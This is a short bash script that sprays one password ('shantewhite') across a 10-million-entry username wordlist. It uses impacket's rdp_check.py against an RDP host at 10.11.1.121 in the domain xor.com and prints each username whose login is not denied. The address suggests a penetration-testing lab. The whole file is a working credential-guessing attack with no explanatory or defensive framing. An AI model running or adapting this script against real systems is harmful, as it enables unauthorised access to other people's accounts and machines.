#!/bin/bash

check="[-] Access Denied"


while IFS= read -r line; do

k=$(python3 ~/Tools/impacket/examples/rdp_check.py xor.com/$line:shantewhite@10.11.1.121 | grep Denied)


	if [ "$k" != "$check" ]; then

		echo $line 

	fi

done < xato-net-10-million-usernames.txt
